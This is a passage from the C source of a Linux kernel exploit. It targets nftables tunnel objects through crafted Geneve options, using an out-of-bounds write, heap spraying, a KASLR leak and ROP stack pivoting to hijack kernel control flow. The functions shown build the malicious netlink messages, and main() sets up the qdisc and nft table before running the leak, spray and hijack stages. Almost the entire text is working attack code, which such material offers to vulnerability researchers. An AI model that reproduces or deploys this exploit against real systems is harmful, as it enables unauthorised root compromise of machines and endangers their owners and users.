    uint32_t *lptr = (void *)(stack_buf + 28);
    *lptr = actual_data_offset / 4;
    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_GENEVE_DATA, 32, stack_buf);
    mnl_attr_nest_end(nlh, anchor_opts_genve);

    // OPT-3
    // need to control 16 bytes totally
    anchor_opts_genve = mnl_attr_nest_start(nlh, NFTA_TUNNEL_KEY_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, NFTA_TUNNEL_KEY_GENEVE_CLASS, 0);
    mnl_attr_put_u8(nlh, NFTA_TUNNEL_KEY_GENEVE_TYPE, 0);
    memset(stack_buf, 'C', 16);
    uint64_t *migrate_gadget2_ptr = (uint64_t *)stack_buf;
    *migrate_gadget2_ptr = pop_rsp_ret_addr + kaslr_offset;
    uint64_t *fake_stack_ptr = (uint64_t *)(stack_buf + 8);
    *fake_stack_ptr = leak_pty_port_addr + 0xd0; // 0x0d0 ~ 0x1c0 almost

    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_GENEVE_DATA, 16, stack_buf);
    mnl_attr_nest_end(nlh, anchor_opts_genve);

    // OPT-4, control the final +0x80 offset value
    // the current length should be 91 + 4 + 16 = 111
    // hence next opt will be 444 + 0x90 - 0x200 = 0x4c offset
    // we want to write 0x80 ~ 0x88 bytes, 0x88 - 0x4c =
    anchor_opts_genve = mnl_attr_nest_start(nlh, NFTA_TUNNEL_KEY_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, NFTA_TUNNEL_KEY_GENEVE_CLASS, 0);
    mnl_attr_put_u8(nlh, NFTA_TUNNEL_KEY_GENEVE_TYPE, 0);
    memset(stack_buf, 'D', 56);
    // cache align, ops is the last one
    uint64_t *fake_ops_ptr = (uint64_t *)(stack_buf + 0x30);
    // we need to hijack *DUMP* command
    // will place at the last slot of our payload
    // *fake_ops_ptr = leak_pty_port_addr + 0x1b8 - 0x20;
    // XXX: also need to hack `obj->ops->type` ...
    // NOTE: `nft_tunnel_obj_type` is module value

    *fake_ops_ptr = leak_pty_port_addr + 0x1b8 - 0x30;

    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_GENEVE_DATA, 56, stack_buf);
    mnl_attr_nest_end(nlh, anchor_opts_genve);

    mnl_attr_nest_end(nlh, anchor_tunnel_key_opts);
    return 0;
}

static void create_malicious_nft_tunnel_object()
{
    struct nlmsghdr *nlh;
    struct nfgenmsg *nfgenptr;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    memset(buf, 0, sizeof(buf));
    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ;
    nfgenptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct nfgenmsg));
    nfgenptr->nfgen_family = NFPROTO_NETDEV;
    // ntohl. int32be
    mnl_attr_put_u32(nlh, NFTA_OBJ_TYPE, htonl(NFT_OBJECT_TUNNEL));
    mnl_attr_put_str(nlh, NFTA_OBJ_TABLE, MY_NFT_TABLE_NAME);
    mnl_attr_put_str(nlh, NFTA_OBJ_NAME, MY_NFT_OBJ_NAME);
    // * attrs - nft_tunnel_key_policy
    struct nlattr *anchor_obj_data = mnl_attr_nest_start(nlh, NFTA_OBJ_DATA);
    // `NFTA_TUNNEL_KEY_ID` must
    mnl_attr_put_u32(nlh, NFTA_TUNNEL_KEY_ID, 0x0);
    struct nlattr *anchor_key_ip = mnl_attr_nest_start(nlh, NFTA_TUNNEL_KEY_IP);
    // * attrs - nft_tunnel_ip_policy
    in_addr_t ipv4_src, ipv4_dst;
    ipv4_src = inet_addr("8.8.8.8");
    ipv4_dst = inet_addr("9.9.9.9");
    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_IP_SRC, sizeof(ipv4_src), &ipv4_src);
    mnl_attr_put(nlh, NFTA_TUNNEL_KEY_IP_DST, sizeof(ipv4_dst), &ipv4_dst);
    mnl_attr_nest_end(nlh, anchor_key_ip);
    setup_oob_opts(nlh);
    mnl_attr_nest_end(nlh, anchor_obj_data);
    nlmsg_sub_send_one_batch(mnl_socket_get_fd(nft_mnl_socket), (char *)nlh, nlh->nlmsg_len, 0);
}

void hijack_process()
{
    // 1) spray a lot of kmalloc-512 nft_tunnel_object
    for (int i = 0; i < OOBW_SPRAY_SLOT_NUM; i++)
    {
        spray_nft_tunnel_object(i);
    }

    // 2) they are possibly *consecutive*, delete *some*
    // XXX: nothing but luck here
    //      use -4 because 8 objects make one page, *-4 may have luck*
    //      debug `nf_tables_delobj` and `nft_obj_init` for details
    int target = OOBW_SPRAY_SLOT_NUM - 4;
    struct nlmsghdr *nlh;
    struct nfgenmsg *nfgenptr;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    char namebuf[32] = {0};

    memset(buf, 0, sizeof(buf));
    sprintf(namebuf, "tunnel%d", target);

    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELOBJ;
    nfgenptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct nfgenmsg));
    nfgenptr->nfgen_family = NFPROTO_NETDEV;
    mnl_attr_put_u32(nlh, NFTA_OBJ_TYPE, htonl(NFT_OBJECT_TUNNEL));
    mnl_attr_put_str(nlh, NFTA_OBJ_TABLE, MY_NFT_TABLE_NAME);
    mnl_attr_put_str(nlh, NFTA_OBJ_NAME, namebuf);

    nlmsg_sub_send_one_batch(mnl_socket_get_fd(nft_mnl_socket), (char *)nlh, nlh->nlmsg_len, 0);

    // 3) craft malicious one and do OOB write
    // XXX: could this allocation just fit into the deleted one? hope so
    //      otherwise we need to debug where is the noise
    create_malicious_nft_tunnel_object();

    // 4) call .dump for each of these objects to hijack RIP
    //    XXX: any smart solution to know which one
    //         maybe we can overwrite user data length blabla
    for (int i = OOBW_SPRAY_SLOT_NUM - 1; i >= 0; i--)
    {
        // MUST NOT BE THIS ONE
        if (i == OOBW_SPRAY_SLOT_NUM - 4)
            continue;
        memset(buf, 0, sizeof(buf));
        sprintf(namebuf, "tunnel%d", i);
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_flags = NLM_F_REQUEST;
        nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETOBJ;
        nfgenptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct nfgenmsg));
        nfgenptr->nfgen_family = NFPROTO_NETDEV;
        mnl_attr_put_u32(nlh, NFTA_OBJ_TYPE, htonl(NFT_OBJECT_TUNNEL));
        mnl_attr_put_str(nlh, NFTA_OBJ_TABLE, MY_NFT_TABLE_NAME);
        mnl_attr_put_str(nlh, NFTA_OBJ_NAME, namebuf);
        // GETOBJ not need *BATCH*
        mnl_socket_sendto(nft_mnl_socket, nlh, nlh->nlmsg_len);
        // XXX: check PID maybe to decide success or not?
    }
}

/////////////////////////////////////
// MAIN
/////////////////////////////////////
int main(int argc, char const *argv[])
{
    int err;

    // basic prepare
    prepare();

    // misc prepare
    err = system("ip link set lo up");
    if (err)
        errExit("fail `ip link set lo up`");

    // b. create qdisc
    err = system("tc qdisc add dev lo root handle 1: drr");
    if (err)
        errExit("fail `tc qdisc add dev lo root handle 1: drr`");

    // c. create class
    err = system("tc class add dev lo parent 1: classid 1:10 drr quantum 60");
    if (err)
        errExit("fail `tc class add dev lo parent 1: classid 1:10 drr quantum 60`");

    // d. create netlink table
    err = system("nft add table netdev mytable");
    if (err)
        errExit("nft create table fail");

    LOG_INFO("Start leak process via OOB read");
    leak_process();

    LOG_INFO("Start ROP spray process");
    rop_spray_process();

    LOG_INFO("Start overwrite hijack process");
    // getchar();
    hijack_process();

    while (1)
        sleep(1);
}